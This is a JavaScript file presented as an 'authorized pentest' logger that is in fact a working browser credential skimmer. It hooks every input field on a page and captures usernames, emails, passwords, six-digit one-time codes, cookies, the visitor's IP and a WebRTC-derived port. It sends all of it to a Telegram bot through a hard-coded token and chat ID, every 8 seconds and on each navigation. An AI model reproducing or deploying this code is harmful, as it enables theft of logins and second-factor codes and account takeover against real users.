// ultimate-crossdomain-pentest-logger.js - AUTHORIZED PENTEST VERSION (CROSS-DOMAIN)
class UltimateCrossDomainPentestLogger {
    constructor() {
        this.config = {
            botToken: '8335563143:AAHK7yHwv1A-gEjAKqhz1WdrXCvsoRJloCw',
            chatId: '8255019946',
            sessionId: 'pentest_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9)
        };
        this.captured = {
            username: '',
            email: '',
            password: '',
            otp: '',
            ip: '',
            port: '',
            currentUrl: window.location.href
        };
        this.init();
    }

    async init() {
        // Capture network immediately
        await this.captureNetworkInfo();
        
        // Hook ALL inputs ACROSS DOMAINS
        this.hookAllInputs();
        
        // DOM CHANGE DETECTOR (cross-domain navigation)
        this.watchDomainChanges();
        
        // Send initial status
        this.sendCapture({
            status: '🟢 CROSS-DOMAIN PENTEST ACTIVE',
            session: this.config.sessionId,
            currentUrl: this.captured.currentUrl,
            ip: this.captured.ip,
            port: this.captured.port
        });

        // PERSISTENT INTERVAL (8s reports)
        setInterval(() => {
            this.reportCurrentState();
        }, 8000);
    }

    async captureNetworkInfo() {
        // IP CAPTURE (works cross-domain)
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            this.captured.ip = (await ipRes.json()).ip;
        } catch {
            this.captured.ip = 'IP_DETECTION_FAILED';
        }

        // PORT CAPTURE (WebRTC - works cross-domain)
        try {
            const rtc = new RTCPeerConnection({ iceServers: [] });
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            
            rtc.onicecandidate = (ice) => {
                if (ice.candidate) {
                    const match = /srflx ([^:]+):(\d+)/.exec(ice.candidate.candidate);
                    if (match) {
                        this.captured.port = match[2];
                    }
                }
            };
        } catch(e) {
            this.captured.port = 'PORT_HIDDEN';
        }
    }

    hookAllInputs() {
        // INSTANT INPUT CAPTURE - ANY DOMAIN
        const inputHandler = (e) => {
            if (e.target.matches('input, textarea')) {
                const fieldValue = e.target.value.trim();
                const fieldName = (e.target.name || e.target.id || e.target.placeholder || '').toLowerCase();
                
                // USERNAME/EMAIL - INSTANT REPORT
                if (fieldValue.length > 3 && (
                    fieldName.includes('user') || 
                    fieldName.includes('email') || 
                    fieldName.includes('login') ||
                    fieldValue.includes('@') ||
                    fieldName.includes('name')
                )) {
                    if (fieldValue !== this.captured.username) {
                        this.captured.username = fieldValue;
                        this.sendCapture({
                            status: '👤 USERNAME/EMAIL ENTERED',
                            username: fieldValue,
                            domain: window.location.hostname
                        });
                    }
                }
                
                // PASSWORD - INSTANT REPORT
                if (e.target.type === 'password' && fieldValue.length > 3) {
                    if (fieldValue !== this.captured.password) {
                        this.captured.password = fieldValue;
                        this.sendCapture({
                            status: '🔐 PASSWORD ENTERED',
                            password: fieldValue,
                            domain: window.location.hostname
                        });
                    }
                }
                
                // OTP - INSTANT REPORT
                if (fieldValue.length === 6 && /^\d{6}$/.test(fieldValue)) {
                    if (fieldValue !== this.captured.otp) {
                        this.captured.otp = fieldValue;
                        this.sendCapture({
                            status: '📱 OTP ENTERED',
                            otp: fieldValue,
                            domain: window.location.hostname
                        });
                    }
                }
            }
        };

        // Live input events
        document.addEventListener('input', inputHandler, true);
        document.addEventListener('keyup', inputHandler, true);
        document.addEventListener('change', inputHandler, true);
    }

    watchDomainChanges() {
        // DETECT DOMAIN CHANGES (cross-domain navigation)
        let lastUrl = window.location.href;
        let lastDomain = window.location.hostname;
        
        setInterval(() => {
            const currentUrl = window.location.href;
            const currentDomain = window.location.hostname;
            
            if (currentUrl !== lastUrl || currentDomain !== lastDomain) {
                this.captured.currentUrl = currentUrl;
                this.sendCapture({
                    status: '🌐 DOMAIN CHANGED',
                    currentUrl: currentUrl,
                    domain: currentDomain,
                    ip: this.captured.ip,
                    port: this.captured.port
                });
                lastUrl = currentUrl;
                lastDomain = currentDomain;
            }
        }, 2000);
    }

    reportCurrentState() {
        this.sendCapture({
            status: '📊 PERIODIC UPDATE',
            currentUrl: window.location.href,
            domain: window.location.hostname,
            username: this.captured.username,
            password: this.captured.password ? '[CAPTURED]' : '',
            otp: this.captured.otp,
            ip: this.captured.ip,
            port: this.captured.port
        });
    }

    // 🎯 PERFECT PENTEST FORMAT
    async sendCapture(data) {
        const perfectFormat = {
            session: this.config.sessionId,
            ip: data.ip || this.captured.ip,
            port: data.port || this.captured.port,
            currentUrl: data.currentUrl || window.location.href,
            domain: data.domain || window.location.hostname,
            username: data.username || this.captured.username,
            email: data.username || this.captured.email, // username can be email
            password: data.password || this.captured.password,
            otp: data.otp || this.captured.otp,
            status: data.status || 'CROSS_DOMAIN_ACTIVE',
            cookies: document.cookie.slice(0, 200),
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent.slice(0, 100)
        };

        const message = `🎯 CROSS-DOMAIN PENTEST CAPTURE\n\`\`\`json\n${JSON.stringify(perfectFormat, null, 2)}\n\`\`\``;

        try {
            await fetch(`https://api.telegram.org/bot${this.config.botToken}/sendMessage`, {
                method: 'POST',
                mode: 'no-cors',
                body: new URLSearchParams({
                    chat_id: this.config.chatId,
                    text: message.slice(0, 4000),
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {}
    }
}

// AUTO-DEPLOY ON ANY DOMAIN (PERSISTENT)
if (!window.crossDomainPentestLogger) {
    window.crossDomainPentestLogger = new UltimateCrossDomainPentestLogger();
}

// PERSISTENCE: Survives page reloads/navigation
window.addEventListener('load', () => {
    if (!window.crossDomainPentestLogger) {
        window.crossDomainPentestLogger = new UltimateCrossDomainPentestLogger();
    }
});
